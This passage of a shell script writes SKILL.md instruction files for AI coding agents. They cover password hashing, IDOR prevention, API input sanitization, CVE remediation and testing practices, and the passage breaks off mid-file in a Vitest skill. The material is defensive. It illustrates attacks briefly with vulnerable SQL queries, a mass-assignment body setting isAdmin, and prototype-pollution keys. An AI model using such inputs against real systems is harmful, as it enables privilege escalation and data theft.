## Constraints / Rules
- Never truncate user passwords (bcrypt has a 72-byte limit; hash with SHA-256 first if supporting arbitrary length with bcrypt).
- Never send cleartext passwords over unencrypted HTTP.
- Do not reveal whether the username or the password was incorrect ('Invalid credentials').

## Workflow
1. Receive login request and check IP/account rate limits.
2. Query user by email. If not found, execute dummy Argon2id verification and return 401.
3. If found, verify password using Argon2id.
4. On failure, increment failed attempt counter, trigger CAPTCHA or lockout if threshold met, and return generic 401.
5. On success, reset failed attempt counter and issue session.

## Expected Output
Hardened password hashing and authentication controller with Argon2id, timing attack resistance, account lockout, and rate limiting.

## Validation Checklist
- [ ] Are passwords hashed using Argon2id or bcrypt (cost >= 12)?
- [ ] Is dummy hashing performed for non-existent users to eliminate timing differences?
- [ ] Are login failures reported as generic 'Invalid credentials'?
- [ ] Are account lockouts triggered after repeated failures?
- [ ] Are known compromised passwords rejected during registration?

## Common Mistakes & Antipatterns
- Using raw SHA-256 to hash passwords, which modern GPUs can crack at billions of guesses per second.
- Returning 'User not found' on wrong email and 'Incorrect password' on wrong password, allowing attackers to compile lists of valid customer emails.
- Implementing account lockout based solely on IP, allowing distributed botnets to bypass rate limits.

## Concrete Real-World Example
Scenario: An attacker uses a botnet of 10,000 rotating IP addresses to perform credential stuffing against a login endpoint, bypassing simple IP rate limiting.
Prompt: Protect this login endpoint from distributed credential stuffing attacks.
Application: The AI implements dual-key rate limiting (per-IP and per-account), enforces Cloudflare Turnstile verification after 3 failures on an account, hashes with Argon2id, performs dummy hashing on missing users, and locks the target account for 15 minutes after 5 failures.
EOF

cat << 'EOF' > skills/security/authorization/idor-prevention-and-validation/SKILL.md
---
name: "idor-prevention-and-validation"
description: "Eliminating Insecure Direct Object References (IDOR) and Broken Object Level Authorization (BOLA) through contextual tenant scoping, UUIDs, and ownership assertions."
category: "security"
subcategory: "authorization"
language: "agnostic"
framework: "none"
technology: "access-control"
difficulty: "intermediate"
tags: ["security", "idor", "bola", "authorization", "multi-tenant", "ownership-validation"]
---

# Insecure Direct Object Reference (IDOR) Prevention and Tenant Scoping

## Purpose
Provide concrete engineering rules to eliminate IDOR / BOLA vulnerabilities by ensuring every database lookup and mutation verifies resource ownership against authenticated user context.

## When to Use
Use when building any API route accepting resource identifiers in URL parameters (`/api/documents/:id`, `/api/orders/:id/download`).

## Inputs / Context
Route parameters, authenticated session context (userId, orgId, roles), database queries, and authorization rules.

## Instructions
1. Never rely on unguessable IDs (UUIDs) alone as a security mechanism; obscurity is not authorization.
2. Contextual Query Scoping:
   - Never fetch a resource by its ID alone: `SELECT * FROM invoices WHERE id = :invoiceId` is an IDOR vulnerability.
   - Always scope queries to the authenticated tenant or owner:
     `SELECT * FROM invoices WHERE id = :invoiceId AND organization_id = :currentOrgId`
3. Explicit Ownership Verification:
   - For complex permissions where scoping in the query is impossible, load the resource and execute an explicit authorization guard:
     `if (resource.tenantId !== currentUser.tenantId) { throw new ForbiddenError(); }`
4. Prevent Sequential ID Enumeration:
   - Avoid exposing auto-incrementing integer IDs (`/users/104`, `/invoices/105`) in public APIs, which allows attackers to scrape all records by iterating numbers.
   - Use UUIDv7 or nanoid for public-facing identifiers.
5. Enforce Scoping Across Nested Child Routes:
   - When accessing nested resources (`/api/projects/:projectId/tasks/:taskId`), verify BOTH that the project belongs to the user's organization AND that the task belongs to that specific project.
6. Return HTTP `404 Not Found` instead of `403 Forbidden` when accessing unauthorized objects if acknowledging the existence of the object ID leaks confidential data.

## Constraints / Rules
- Never write `UPDATE` or `DELETE` queries that filter only by resource ID without including tenant/user ID scoping.
- Do not trust client-supplied tenant or user IDs in request bodies; read identity strictly from the authenticated session/token.
- Avoid passing raw database sequence IDs in client URLs.

## Workflow
1. Extract resource ID from path parameters.
2. Extract authenticated user ID and organization ID from verified session.
3. Query database with compound filter `WHERE id = :id AND org_id = :orgId`.
4. If no row returned, respond with 404 Not Found.
5. Execute mutation or return data.

## Expected Output
IDOR-free controller and database query code with strict tenant scoping, UUID identifiers, and ownership assertion guards.

## Validation Checklist
- [ ] Are all database lookups scoped by authenticated user/tenant ID?
- [ ] Are auto-incrementing IDs replaced with UUIDs/nanoids in public URLs?
- [ ] Are nested child relations verified against their parent resource?
- [ ] Are mutations (`UPDATE`, `DELETE`) constrained by tenant ownership in SQL?
- [ ] Is user identity sourced exclusively from validated session context?

## Common Mistakes & Antipatterns
- Believing UUIDs make an endpoint secure: `GET /invoices/c8b3a0e1-...` is still an IDOR if any user who obtains that UUID can read the invoice without ownership checks.
- Accepting `tenant_id` or `user_id` in the JSON request body: an attacker changes `user_id` in the payload to take over another user's profile.
- Updating resources with `UPDATE documents SET title = :title WHERE id = :id`, allowing an attacker to overwrite another tenant's documents.

## Concrete Real-World Example
Scenario: An e-commerce API allows customers to download any PDF invoice by changing the invoice ID in the URL: `GET /api/invoices/9482/download`.
Prompt: Fix the IDOR vulnerability on this invoice download endpoint.
Application: The AI extracts `currentUser.organizationId` from the session, replaces the SQL query with `SELECT * FROM invoices WHERE id = :id AND organization_id = :orgId`, returns 404 if not found, and migrates public routes to use UUIDv7 identifiers.
EOF

cat << 'EOF' > skills/security/api-security/input-sanitization-and-defense/SKILL.md
---
name: "input-sanitization-and-defense"
description: "Defending REST and GraphQL APIs against mass assignment, prototype pollution, oversized payloads, JSON bombs, and MIME type confusion attacks."
category: "security"
subcategory: "api-security"
language: "agnostic"
framework: "none"
technology: "api-security"
difficulty: "intermediate"
tags: ["security", "api-security", "mass-assignment", "prototype-pollution", "content-sniffing", "sanitization"]
---

# API Input Sanitization, Mass-Assignment Defense, and Content Sniffing

## Purpose
Instruct AI agents to protect backend APIs from structural payload attacks, accidental privilege escalation via mass assignment, and object prototype tampering.

## When to Use
Use when handling API request bodies, file uploads, third-party webhook ingestions, or updating database models from request parameters.

## Inputs / Context
Inbound request payloads, ORM models, file upload streams, and server middleware configurations.

## Instructions
1. Defend Against Mass Assignment (Over-Posting):
   - Never pass raw request body objects directly into ORM creation or update methods (`User.create(req.body)` or `user.update(req.body)`).
   - Use strict DTOs (Data Transfer Objects) or explicit whitelisting: only extract permitted fields (e.g., `const { name, bio } = req.body;`).
   - Prevent clients from overriding sensitive internal fields: `role`, `isAdmin`, `isVerified`, `accountId`, `balance`.
2. Defend Against Prototype Pollution (JavaScript/Node.js):
   - Reject or sanitize JSON payloads containing `__proto__`, `constructor`, or `prototype` keys before deep merging.
   - Use `Object.create(null)` for dictionary lookups without prototypes, or use `Map`.
3. Payload Size Limits and Parsing Defenses:
   - Configure strict body size limits on JSON parsers (e.g., `express.json({ limit: '100kb' })`) to prevent memory exhaustion DoS.
   - Guard against deeply nested JSON objects (JSON bombs) by enforcing maximum recursion depth in parsers.
4. Prevent MIME-Type Confusion and Content Sniffing:
   - Send `X-Content-Type-Options: nosniff` header on all responses to prevent browsers from executing non-script files as JavaScript.
   - On file upload endpoints, never trust client-supplied `Content-Type` headers or file extensions alone; verify file magic bytes (binary signatures) using libraries like `file-type`.

## Constraints / Rules
- Never pass unvalidated `req.body` directly to database save methods.
- Do not use unbounded `bodyParser.json()` without explicit byte limits.
- Avoid recursive object merging functions without prototype pollution guards.

## Workflow
1. Configure body parser with strict size limit (e.g., 100kb).
2. Filter incoming objects against prototype pollution keys.
3. Validate and whitelist permitted fields into an explicit DTO.
4. Verify uploaded file magic bytes.
5. Attach `X-Content-Type-Options: nosniff` header.

## Expected Output
Hardened API controller and middleware implementing strict DTO whitelisting, prototype pollution defense, and MIME-sniffing prevention.

## Validation Checklist
- [ ] Are database models updated via explicit DTOs rather than raw request bodies?
- [ ] Are sensitive attributes (`role`, `balance`, `admin`) protected from client assignment?
- [ ] Are JSON payload size limits configured (<= 100kb for standard APIs)?
- [ ] Is `X-Content-Type-Options: nosniff` header active?
- [ ] Are uploaded files validated using binary magic bytes?

## Common Mistakes & Antipatterns
- Calling `User.update(req.body, { where: { id } })`, allowing an attacker to submit `{"isAdmin": true}` and elevate their own privileges.
- Merging user objects with an insecure recursive merge function, polluting `Object.prototype` and corrupting the entire Node.js runtime.
- Trusting an uploaded file named `avatar.jpg` that actually contains executable PHP or HTML script.

## Concrete Real-World Example
Scenario: A user profile update endpoint allows users to make themselves system administrators because it passes the entire JSON payload directly into `db.users.update()`.
Prompt: Harden this user profile update route against mass-assignment and prototype pollution.
Application: The AI creates a Zod schema permitting only `firstName`, `lastName`, and `avatarUrl`, strips all unexpected properties, validates payload depth, rejects keys matching `__proto__`, and updates only the whitelisted attributes.
EOF

cat << 'EOF' > skills/security/vulnerability-fixing/cve-remediation-workflow/SKILL.md
---
name: "cve-remediation-workflow"
description: "Systematic process for diagnosing, prioritizing, remediating, and verifying Common Vulnerabilities and Exposures (CVEs) in third-party software dependencies."
category: "security"
subcategory: "vulnerability-fixing"
language: "agnostic"
framework: "none"
technology: "dependency-security"
difficulty: "intermediate"
tags: ["security", "cve", "dependencies", "vulnerability-fixing", "supply-chain", "patching"]
---

# CVE Remediation, Dependency Risk Auditing, and Patch Verification

## Purpose
Provide AI agents with a disciplined workflow for analyzing automated vulnerability alerts (Dependabot, Snyk, npm audit), isolating real exposure, and applying non-breaking patches.

## When to Use
Use when addressing security vulnerability alerts, updating vulnerable packages, reviewing supply chain risks, or remediating open-source dependencies.

## Inputs / Context
Vulnerability report (CVE ID, CVSS score, affected package version, vulnerability vector), dependency lockfile, and application usage context.

## Instructions
1. Triage Vulnerability Report:
   - Identify the Common Vulnerability and Exposure (CVE) identifier and Common Vulnerability Scoring System (CVSS v3/v4) score.
   - Determine the Attack Vector (Network, Local, Physical) and Required Privileges.
2. Determine Actual Exploitability (Reachability Analysis):
   - Inspect project source code to verify whether the vulnerable function, method, or code path is actually imported and executed in the application.
   - If the vulnerable module is never called, document the finding while still prioritizing an upgrade.
3. Formulate Remediation Strategy:
   - Option A (Direct Upgrade): Upgrade the package to the minimum non-vulnerable patched version specified by security advisories.
   - Option B (Transitive Dependency Override): If the vulnerable package is an indirect child of a parent dependency, use lockfile overrides (`resolutions` in Yarn, `overrides` in npm, `pnpm.overrides`) to force the secure version without waiting for parent package updates.
   - Option C (Workaround / Defense): If no patch exists, disable the vulnerable feature, wrap the input with sanitization filters, or replace the package with a secure alternative.
4. Verify Breaking Changes:
   - Review package release notes and changelogs between current and target versions.
   - Run the complete automated test suite to ensure API compatibility.
5. Lockfile Integrity: Always commit updated lockfiles (`package-lock.json`, `poetry.lock`, `Cargo.lock`) alongside manifest changes.

## Constraints / Rules
- Never use `--force` or `--legacy-peer-deps` blindly to silence dependency errors during security updates.
- Never downgrade security fixes to resolve minor linting warnings.
- Do not dismiss a CVE as 'not applicable' without documenting code-level proof of unreachability.

## Workflow
1. Ingest CVE advisory and identify affected versions.
2. Trace dependency tree (`npm ls <package>` or `pipdeptree`).
3. Analyze whether application code reaches the vulnerable functionality.
4. Apply minimal version bump or dependency override.
5. Execute regression tests and verify clean vulnerability scan (`npm audit`).

## Expected Output
Remediated dependency manifests, lockfiles, reachability documentation, and passing regression test verification.

## Validation Checklist
- [ ] Is the package updated to a verified patched version?
- [ ] Is lockfile updated and committed?
- [ ] Does the automated test suite pass with zero regressions?
- [ ] Does the dependency security scanner report 0 high/critical vulnerabilities?
- [ ] Is exploitability analysis documented in the pull request description?

## Common Mistakes & Antipatterns
- Upgrading across multiple major versions blindly to fix a minor patch CVE, introducing massive breaking changes and production outages.
- Deleting the lockfile and regenerating it from scratch, unintentionally updating dozens of unrelated packages simultaneously.
- Silencing security alerts with `.snyk` or audit ignore flags without investigating whether the code path is exposed.

## Concrete Real-World Example
Scenario: Dependabot reports a Critical Remote Code Execution vulnerability (CVSS 9.8) in a nested XML parser package used by an image processing dependency.
Prompt: Remediate this critical transitive dependency vulnerability without breaking existing image workflows.
Application: The AI traces the dependency tree, identifies the minimum non-vulnerable version of the XML parser, adds an `overrides` entry in `package.json`, runs `npm audit` to verify resolution, and runs image processing unit tests to confirm zero regressions.
EOF

cat << 'EOF' > skills/testing/unit/isolated-unit-test-design/SKILL.md
---
name: "isolated-unit-test-design"
description: "Designing fast, deterministic unit test suites following Arrange-Act-Assert (AAA), strict test isolation, state verification over interaction verification, and boundary edge testing."
category: "testing"
subcategory: "unit"
language: "agnostic"
framework: "none"
technology: "unit-testing"
difficulty: "intermediate"
tags: ["testing", "unit-testing", "aaa-pattern", "mocks", "isolation", "deterministic"]
---

# Isolated Unit Testing with Arrange-Act-Assert Discipline

## Purpose
Provide AI agents with rigorous standards for writing fast, maintainable unit tests that test behavior rather than implementation details and run in milliseconds.

## When to Use
Use when writing unit tests for functions, classes, reducers, domain entities, value objects, and business algorithms.

## Inputs / Context
Target function/module, expected domain behavior, boundary inputs (null, empty, negative, max values), and dependencies.

## Instructions
1. Structure every test using the Arrange-Act-Assert (AAA) pattern:
   - Arrange: Set up inputs, test data, and prerequisites.
   - Act: Execute the single method or function under test.
   - Assert: Verify the returned value, resulting state, or thrown error.
2. Ensure Complete Test Isolation: Tests must never depend on the execution order or shared state of other tests. Each test must set up its own isolated state.
3. Test Behavior, Not Implementation Details: Verify public outputs and state transitions; avoid asserting on private methods or internal variable values.
4. Prefer State Verification over Mock Interaction Verification: Verify that the system ended in the correct state rather than asserting that an internal helper function was called 3 times with specific parameters.
5. Test Boundary and Edge Conditions systematically:
   - Empty collections, empty strings, null/undefined inputs.
   - Zero, negative numbers, maximum/minimum integer bounds.
   - Leap years, timezone shifts, daylight saving transitions.
   - Unicode, emoji, and non-ASCII character handling.
6. Keep unit tests fast and deterministic: zero network calls, zero database writes, zero sleep timers.
7. Use descriptive test names following the 'Given_When_Then' or 'Should_When' convention (e.g., `calculateTotal_WhenCouponApplied_ShouldDeductDiscount`).

## Constraints / Rules
- Never write unit tests that require internet connectivity or live external services.
- Never write tests that sleep (`sleep(1000)`) to wait for asynchronous conditions.
- Avoid over-mocking: if an object can be instantiated as a lightweight real instance (like a value object), do not mock it.

## Workflow
1. Identify the public interface and state transitions of the target unit.
2. Outline test cases: Happy path, Invalid input, Boundary cases, Exception cases.
3. Write isolated test cases adhering strictly to AAA blocks.
4. Execute tests and ensure zero cross-test state leakage.
5. Verify coverage reports to ensure all logical decision branches are exercised.

## Expected Output
Deterministic, readable unit tests with clean AAA separation, descriptive names, and thorough boundary coverage.

## Validation Checklist
- [ ] Does every test follow Arrange-Act-Assert structure?
- [ ] Can tests be run in parallel in any arbitrary order without failure?
- [ ] Are boundary conditions (null, zero, empty, max) explicitly tested?
- [ ] Are external network and storage calls completely isolated?
- [ ] Do test names clearly describe the scenario and expected outcome?

## Common Mistakes & Antipatterns
- Asserting that a private internal method was called (`expect(obj._helper).toHaveBeenCalled()`), making tests brittle to harmless refactoring.
- Sharing mutable global objects between test cases, causing tests to pass when run together but fail when run in isolation.
- Writing tests with multiple unrelated assertions testing 10 different features in a single giant test function.

## Concrete Real-World Example
Scenario: A tax calculator function has flaky tests that occasionally fail depending on the developer's local timezone.
Prompt: Write robust, deterministic unit tests for this tax calculation module.
Application: The AI crafts unit tests freezing the timezone context, exercises edge cases ($0 subtotal, negative amounts, exempt tax codes, maximum currency limits), structures each test in AAA blocks, and verifies exact cents rounding without mocks.
EOF

cat << 'EOF' > skills/testing/integration/database-boundary-testing/SKILL.md
---
name: "database-boundary-testing"
description: "Authoring reliable integration tests against real database engines using ephemeral Docker containers (Testcontainers), automated migrations, and transactional rollbacks."
category: "testing"
subcategory: "integration"
language: "agnostic"
framework: "none"
technology: "testcontainers"
difficulty: "advanced"
tags: ["testing", "integration", "testcontainers", "database", "postgres", "docker"]
---

# Database Boundary Integration Testing with Testcontainers

## Purpose
Instruct AI agents to author true integration tests that run against real database engines in isolated Docker containers, verifying actual SQL queries, constraints, and migration scripts.

## When to Use
Use when testing database repositories, complex SQL queries, migrations, foreign key cascades, or ORM mapping configurations.

## Inputs / Context
Database migration scripts, repository interface, sample seed fixtures, and test suite runner.

## Instructions
1. Test against real database engines: never substitute an in-memory database (like H2 or SQLite) when testing code targeted for PostgreSQL or MySQL in production; dialect and locking differences invalidate tests.
2. Use Testcontainers to spin up ephemeral, lightweight container instances of the exact production database version.
3. Run all database migration scripts against the containerized database before the test suite begins.
4. Maintain Test Isolation between test cases:
   - Approach A (Transactional Rollback): Wrap each test in a database transaction and roll it back in the teardown phase (`ROLLBACK`).
   - Approach B (Table Truncation): Fast-truncate all tables between tests while preserving foreign key constraints and schema structure.
5. Test Real Database Constraints:
   - Unique index violations.
   - Foreign key cascading deletes and nullifications.
   - Check constraints and nullability constraints.
   - Database triggers and generated columns.
6. Seed minimal, targeted test data per test rather than relying on massive, fragile global seed scripts.
7. Optimize container startup: reuse container instances across test files using singleton container patterns or Testcontainers reusable container flags.

## Constraints / Rules
- Never run integration tests against a shared, persistent development or staging database where tests can overwrite each other's data.
- Never use H2 in 'PostgreSQL compatibility mode' for testing PostgreSQL features like JSONB or partial indexes.
- Do not leave dangling Docker containers after test suite completion.

## Workflow
1. Define Testcontainers lifecycle hooks (startup before suite, shutdown after suite).
2. Execute migration runner (Flyway, Liquibase, Prisma, Alembic) on container startup.
3. Write repository tests verifying CRUD operations, joins, and constraint failures.
4. Reset table data between individual test executions.
5. Verify clean exit and resource cleanup.

## Expected Output
High-confidence integration test suite running against an ephemeral containerized database with automated schema migration and clean test data resets.

## Validation Checklist
- [ ] Are tests running against the actual production database engine (not in-memory mocks)?
- [ ] Are migration scripts executed and verified?
- [ ] Is test data cleaned up between tests without cross-test pollution?
- [ ] Are database constraints (unique keys, foreign keys) explicitly verified?
- [ ] Are container lifecycles managed cleanly without orphaned processes?

## Common Mistakes & Antipatterns
- Testing PostgreSQL-specific JSONB operators against an in-memory SQLite database, which crashes with syntax errors.
- Forgetting to truncate tables between tests, causing test B to fail because test A inserted an unexpected record with the same email.
- Running migration scripts manually outside the test lifecycle, leading to broken CI pipelines.

## Concrete Real-World Example
Scenario: A user repository test passes in CI using SQLite, but fails in production because a PostgreSQL foreign key cascade behavior was improperly configured.
Prompt: Convert this repository test suite to use Testcontainers with real PostgreSQL.
Application: The AI configures a singleton PostgreSQL Testcontainer, runs database migrations on startup, wraps repository test assertions in rollback transactions, and verifies foreign key deletion constraints against real Postgres behavior.
EOF

cat << 'EOF' > skills/testing/e2e/deterministic-flow-testing/SKILL.md
---
name: "deterministic-flow-testing"
description: "Architecting stable, flake-free End-to-End (E2E) tests covering critical user journeys, deterministic test data provisioning, and resilient assertion strategies."
category: "testing"
subcategory: "e2e"
language: "typescript"
framework: "none"
technology: "e2e-testing"
difficulty: "intermediate"
tags: ["testing", "e2e", "flaky-tests", "test-data", "user-journeys", "automation"]
---

# Deterministic End-to-End (E2E) Workflow Testing

## Purpose
Provide AI agents with standards for authoring End-to-End tests that verify critical end-user journeys without suffering from timing flakiness or brittle selectors.

## When to Use
Use when testing critical revenue paths: user registration, onboarding, subscription purchase, checkout, and account settings.

## Inputs / Context
User flow specification, web application URL, authentication mechanism, external service mock requirements, and test environment configuration.

## Instructions
1. Restrict E2E testing to Critical User Journeys (the 5-10 workflows that must never break in production); do not attempt 100% test coverage with E2E tests alone.
2. Provision Deterministic Test Data:
   - Create fresh, isolated test users and organizations via API calls or database seeds before launching the browser test; never rely on shared, static test accounts.
   - Append unique timestamps or UUIDs to generated test usernames and emails.
3. Decouple from External Third Parties:
   - Stub or mock third-party payment gateways (Stripe), SMS providers (Twilio), and email delivery services at the network layer during E2E runs.
4. Eliminate Arbitrary Sleep Delays:
   - Never write `sleep(3000)` or wait for fixed durations; always wait for explicit UI state changes (element visible, text matching, network response resolved).
5. Prefer User-Facing Selectors:
   - Locate elements by accessible role and accessible name (e.g., `getByRole('button', { name: 'Submit' })`) or dedicated test IDs (`data-testid`); avoid styling classes or brittle XPath expressions.
6. Ensure Complete Teardown:
   - Clean up created test accounts and database records in after-all hooks or via automated ephemeral test environment teardown.

## Constraints / Rules
- Never use hardcoded arbitrary sleep statements (`await sleep(5000)`).
- Avoid selecting elements by CSS class names (`.btn-primary-blue-active`) or deep DOM hierarchies (`div > span > button`).
- Never run E2E test suites against production databases.

## Workflow
1. Define critical user journey steps and exit criteria.
2. Provision test user credentials via backend API.
3. Navigate browser and interact using accessible role selectors.
4. Assert on visible DOM state changes and completed network calls.
5. Clean up provisioned data on completion.

## Expected Output
Clean, resilient E2E test scripts utilizing semantic selectors, dynamic data provisioning, and zero arbitrary sleep statements.

## Validation Checklist
- [ ] Are elements selected via accessible roles or `data-testid`?
- [ ] Are all fixed sleep calls replaced with auto-waiting assertions?
- [ ] Is test data generated uniquely per test run?
- [ ] Are third-party payment and messaging APIs mocked/stubbed?
- [ ] Does the test verify the complete user journey from start to finish?

## Common Mistakes & Antipatterns
- Using `page.waitForTimeout(5000)` to wait for a modal, which still fails intermittently when CI runners experience CPU throttling.
- Targeting `.css-1x8g9z` styled-components hash classes that change with every build.
- Using a single hardcoded test user (`testuser@example.com`) across parallel test workers, causing simultaneous tests to log each other out.

## Concrete Real-World Example
Scenario: An e-commerce checkout E2E test fails randomly 30% of the time in GitHub Actions due to timing issues and payment gateway latency.
Prompt: Refactor this flaky checkout E2E test to be completely deterministic and resilient.
Application: The AI creates a unique test customer via API, stubs Stripe API network calls with deterministic mock tokens, replaces CSS class selectors with `getByRole`, and replaces `waitForTimeout(4000)` with `toBeVisible()` assertions on the order confirmation card.
EOF

cat << 'EOF' > skills/testing/playwright/resilient-page-object-testing/SKILL.md
---
name: "resilient-page-object-testing"
description: "Architecting scalable browser test suites in Playwright using the Page Object Model (POM), locator auto-waiting, visual regression, and network route interception."
category: "testing"
subcategory: "playwright"
language: "typescript"
framework: "playwright"
technology: "playwright"
difficulty: "advanced"
tags: ["testing", "playwright", "page-object-model", "locators", "network-mocking", "e2e"]
---

# Playwright Architecture with Page Object Models and Network Mocking

## Purpose
Instruct AI agents to author enterprise-grade Playwright test suites utilizing maintainable Page Object Models, auto-waiting locators, and deterministic network route mocks.

## When to Use
Use when implementing automated browser testing with Playwright, creating cross-browser test suites, or testing complex client-side applications.

## Inputs / Context
Application URL, page templates, interactive elements, user workflows, and API mocks.

## Instructions
1. Structure test suites using the Page Object Model (POM):
   - Encapsulate page locators and user interactions inside dedicated class files (e.g., `LoginPage.ts`, `DashboardPage.ts`).
   - Keep assertions inside test files (`*.spec.ts`), using Page Objects purely to perform actions and expose locators.
2. Leverage Playwright's Built-in Auto-Waiting Locators:
   - Use `page.getByRole()`, `page.getByText()`, `page.getByLabel()`, and `page.getByTestId()`.
   - Never call `page.waitForSelector()` or `page.waitForTimeout()`; Playwright locators automatically wait for actionable conditions (attached, visible, stable, enabled) before clicking or filling.
3. Use Web-First Assertions:
   - Always use `await expect(locator).toBeVisible()`, `await expect(locator).toHaveText()`, or `await expect(locator).toBeEnabled()`.
   - Web-first assertions poll automatically until conditions are satisfied or timeout occurs.
4. Intercept and Mock Network Requests using `page.route()`:
   - Mock slow or non-deterministic third-party APIs: `await page.route('**/api/v1/quotes', route => route.fulfill({ json: mockQuotes }))`.
   - Test network error handling: simulate HTTP 500 or offline conditions using `route.abort()`.
5. Capture Artifacts on Failure:
   - Configure `playwright.config.ts` to capture screenshots, video, and execution trace files (`trace: 'retain-on-failure'`) for fast post-mortem debugging.
6. Reusable Authentication State:
   - Authenticate once in a global setup step and save storage state (`storageState: 'auth.json'`) to avoid logging in via UI in every single test.

## Constraints / Rules
- Never write `page.waitForTimeout()` in Playwright tests.
- Never place assertions inside Page Object classes; keep Page Objects focused on actions and locators.
- Avoid broad XPath selectors (`//div[2]/span[3]/button`).

## Workflow
1. Create Page Object classes defining locators and action methods.
2. Configure `playwright.config.ts` with cross-browser matrix (Chromium, Firefox, WebKit) and trace recording.
3. Write test specifications importing Page Objects.
4. Apply network route intercepts for external APIs.
5. Run tests via `npx playwright test` and inspect traces via `npx playwright show-trace`.

## Expected Output
Modular Playwright test suite featuring Page Object Models, web-first assertions, route mocking, and failure trace capture.

## Validation Checklist
- [ ] Are Page Object Models used to encapsulate UI selectors and interactions?
- [ ] Are web-first assertions (`expect(locator).toBeVisible()`) used exclusively?
- [ ] Are arbitrary timeouts completely eliminated?
- [ ] Is authentication state reused across tests to optimize execution speed?
- [ ] Is trace capture configured on test failure?

## Common Mistakes & Antipatterns
- Using `expect(await locator.isVisible()).toBe(true)`, which checks visibility once synchronously without auto-waiting, causing flaky race conditions.
- Putting `expect()` statements inside Page Object methods, coupling page structure to specific test assertions.
- Re-executing the full UI login form in every single test file instead of reusing Playwright `storageState`.

## Concrete Real-World Example
Scenario: An analytics dashboard test suite takes 15 minutes to run and fails randomly when the backend data warehouse query takes longer than 2 seconds.
Prompt: Optimize this Playwright test suite using Page Object Models and network route mocking.
Application: The AI creates `AnalyticsPage` with `getByRole` locators, intercepts `/api/analytics` via `page.route` to return instant mocked metrics, saves 5 seconds per test by reusing authenticated storage state, and reduces suite execution time to 45 seconds with 100% stability.
EOF

cat << 'EOF' > skills/testing/jest/snapshot-and-mock-discipline/SKILL.md
---
name: "snapshot-and-mock-discipline"
description: "Writing robust Jest test suites with strict mock isolation, clear lifecycle restoration, targeted inline snapshots, and timer virtualization."
category: "testing"
subcategory: "jest"
language: "typescript"
framework: "jest"
technology: "jest"
difficulty: "intermediate"
tags: ["testing", "jest", "mocking", "snapshots", "timers", "unit-testing"]
---

# Jest Snapshot Testing Discipline and Mock Hygiene

## Purpose
Provide concrete rules for authoring clean, maintainable Jest test suites, avoiding uncontrolled snapshot sprawl, and preventing cross-test mock pollution.

## When to Use
Use when testing JavaScript/TypeScript applications with Jest, mocking external modules, virtualizing timers, or testing formatted data outputs.

## Inputs / Context
Target modules, external dependencies to mock, time-dependent logic, and expected test assertions.

## Instructions
1. Practice Strict Mock Hygiene:
   - Always clean up mocks between tests: configure `clearMocks: true`, `resetMocks: true`, or call `jest.restoreAllMocks()` in `afterEach()`.
   - Prefer spying (`jest.spyOn(object, 'method')`) over wholesale module replacement (`jest.mock('...')`) when only a single method requires stubbing.
2. Snapshot Testing Discipline:
   - Never take full-page or massive component tree snapshots (> 30 lines); developers blindly press `u` to update large snapshots without reading diffs.
   - Use Targeted Inline Snapshots (`toMatchInlineSnapshot()`) for small, predictable outputs (formatted strings, error messages, JSON payloads).
   - Only snapshot data structures that represent stable serialization contracts.
3. Virtualize Timers Safely:
   - When testing code with `setTimeout`, `setInterval`, or debounce logic, use `jest.useFakeTimers()` and advance time explicitly with `jest.advanceTimersByTime(ms)`.
   - Always restore real timers in `afterEach()` via `jest.useRealTimers()`.
4. Type-Safe Mocking in TypeScript:
   - Use `jest.mocked(myFunction)` to ensure mock declarations and assertions are verified by the TypeScript compiler.
5. Avoid Testing Implementation Details:
   - Verify function outputs and state changes rather than asserting on every internal helper function call.

## Constraints / Rules
- Never commit massive multi-thousand line `.snap` files.
- Never leave fake timers enabled globally across test files.
- Avoid `jest.mock()` at the top of a file when `jest.spyOn()` within a specific test scope is cleaner.

## Workflow
1. Configure Jest configuration with clean mock resets.
2. Use `jest.spyOn()` to mock specific boundary dependencies.
3. Apply fake timers for time-dependent functions.
4. Use inline snapshots for targeted serialization verification.
5. Restore real timers and spies in `afterEach()`.

## Expected Output
Clean Jest test specifications with type-safe mocks, scoped spies, restored timers, and targeted inline snapshots.

## Validation Checklist
- [ ] Are mocks restored in `afterEach()` to prevent cross-test pollution?
- [ ] Are fake timers restored with `jest.useRealTimers()`?
- [ ] Are snapshots short and targeted using `toMatchInlineSnapshot()`?
- [ ] Are mocks typed using `jest.mocked()`?
- [ ] Do tests pass when run in isolation (`jest -t "test name"`)?

## Common Mistakes & Antipatterns
- Forgetting `jest.useRealTimers()` in teardown, causing subsequent test files in the suite to hang indefinitely.
- Blindly updating a 500-line snapshot file with `jest -u`, masking a serious regression in button styling or text.
- Mocking a module globally without clearing mock call history, causing test 2 to see calls made during test 1.

## Concrete Real-World Example
Scenario: A notification scheduler test suite hangs intermittently and fails when tests are run in random order due to leaky mocks and real timers.
Prompt: Refactor this Jest scheduler test suite for strict mock hygiene and timer virtualization.
Application: The AI scopes mocks using `jest.spyOn`, wraps interval tests in `jest.useFakeTimers()`, advances time with `jest.advanceTimersByTime(60000)`, restores real timers in `afterEach()`, and replaces bulky external snapshot files with targeted inline snapshots.
EOF

cat << 'EOF' > skills/testing/vitest/fast-esm-test-suites/SKILL.md
---
name: "fast-esm-test-suites"
description: "Architecting high-performance ESM-native unit and integration test suites using Vitest, thread pool configuration, in-source testing, and Vite plugin sharing."
category: "testing"
subcategory: "vitest"
language: "typescript"
framework: "vitest"
technology: "vitest-esm"
difficulty: "intermediate"
tags: ["testing", "vitest", "esm", "vite", "in-source-testing", "fast-tests"]
---

# Vitest High-Speed ESM Test Suites and In-Source Testing

## Purpose
Instruct AI agents to configure and author lightning-fast ESM-native test suites with Vitest, leveraging shared Vite build configurations and concurrent test execution.

## When to Use
Use when testing modern Vite-based web applications, ESM libraries, Node.js microservices, or replacing slow Jest test setups.

## Inputs / Context
Vite configuration, TypeScript project setup, test target files, and concurrency requirements.

## Instructions
1. Leverage Native ESM: Vitest runs on native ES modules without requiring complex Babel or ts-jest transformation pipelines.
2. Share Configuration with Vite: Configure tests inside `vite.config.ts` using the `test` property, inheriting all path aliases, plugins, and environment definitions.
3. Configure Optimal Concurrency:
   - Use `test.concurrent` for independent, I/O-bound tests to execute them in parallel within the same file.
   - Configure thread pools in `vitest.config.ts`: choose `pool: 'threads'` for multi-threaded CPU-heavy suites or `pool: 'forks'` when native C++ modules or isolated process state is required.
4. In-Source Testing for Pure Utilities:
   - For algorithmic helpers and math functions, embed tests directly alongside implementation code inside `if (import.meta.vitest) { ... }`, enabling instant feedback and automated tree-shaking in production builds.
5. Use Vitest Vi Spies and Mocks:
